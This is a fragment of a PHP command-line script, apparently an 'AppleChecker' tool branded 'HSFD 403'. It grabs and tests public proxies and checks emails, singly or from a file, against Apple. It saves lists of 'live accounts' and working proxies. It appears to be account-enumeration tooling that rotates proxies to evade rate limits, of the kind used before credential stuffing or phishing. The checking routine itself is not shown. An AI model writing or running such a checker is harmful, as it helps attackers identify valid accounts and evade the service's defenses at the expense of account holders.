        echo Colors::text("   --timeout=<sec>       Request timeout (default: 20)\n", Colors::WHITE);
        echo Colors::text("   --no-proxy            Disable proxy\n", Colors::WHITE);
        echo Colors::text("   --proxy-file=<path>   Custom proxy list\n", Colors::WHITE);
        echo Colors::text("   --max-proxies=<n>     Max proxies to grab (default: 1000)\n", Colors::WHITE);
        echo Colors::text("   --help                This help\n\n", Colors::WHITE);

        echo Colors::text(" ── " . Colors::text("HSFD 403", Colors::BRED) . " ── " . Colors::text("v4.0 ULTRA", Colors::BCYAN) . " ──\n\n";
        exit(0);
    }

    try {
        $checker = new AppleChecker();

        if (isset($options['threads'])) $checker->setThreads((int)$options['threads']);
        if (isset($options['timeout'])) $checker->setTimeout((int)$options['timeout']);
        if (isset($options['no-proxy'])) $checker->setUseProxy(false);

        $pg = $checker->getProxyGrabber();
        if (isset($options['max-proxies'])) $pg->maxProxies = (int)$options['max-proxies'];

        if ($checker->getUseProxy()) {
            if (isset($options['proxy-file'])) {
                echo Colors::text(" [*] Loading proxies from: {$options['proxy-file']}\n", Colors::ICYAN);
                $proxies = $pg->loadFromFile($options['proxy-file']);
                echo Colors::text(" [+] Loaded " . count($proxies) . " proxies\n", Colors::IGREEN);
                if (!empty($proxies)) {
                    $pg->testAll(30);
                }
            } else {
                $pg->grabAll();
                $pg->testAll(30);
            }
        }

        if (isset($options['email'])) {
            $results = [$checker->checkEmail($options['email'])];

            echo Colors::text("\n ┌─ RESULT ───────────────────────────────────────────┐\n", Colors::ICYAN);
            echo sprintf(" │ %s %s %s\n",
                Colors::status($results[0]['status']),
                Colors::text(str_pad($results[0]['email'], 30), Colors::BWHITE),
                Colors::text($results[0]['status_label'], Colors::IGREEN)
            );
            echo Colors::text(" └────────────────────────────────────────────────────┘\n", Colors::ICYAN);
        } else {
            $results = $checker->checkFromFile($options['file']);
        }

        if (isset($options['output'])) {
            $fmt = $options['format'] ?? 'txt';
            $ok = $checker->saveResults($results, $options['output'], $fmt);
            if ($ok) echo Colors::text(" [+] Results saved to: {$options['output']}\n", Colors::IGREEN);
        }

        $live = $checker->getLiveResults();
        if (!empty($live)) {
            $lf = 'LIVE_' . date('Ymd_His') . '.txt';
            $c = "=== LIVE ACCOUNTS ===\nAuthor: HSFD 403\nDate: " . date('Y-m-d H:i:s') . "\nTotal: " . count($live) . "\n\n";
            foreach ($live as $r) $c .= $r['email'] . " | " . $r['status_label'] . "\n";
            file_put_contents($lf, $c);
            echo Colors::text(" [+] Live accounts saved: $lf (" . count($live) . ")\n", Colors::IGREEN);
        }

        $wp = $pg->getTested();
        if (!empty($wp)) {
            $pf = 'proxies_' . date('Ymd_His') . '.txt';
            $pg->saveToFile($pf, $wp);
        }

    } catch (\Exception $e) {
        echo Colors::text("\n ✖ ERROR: " . $e->getMessage() . "\n", Colors::BRED);
        exit(1);
    }
}
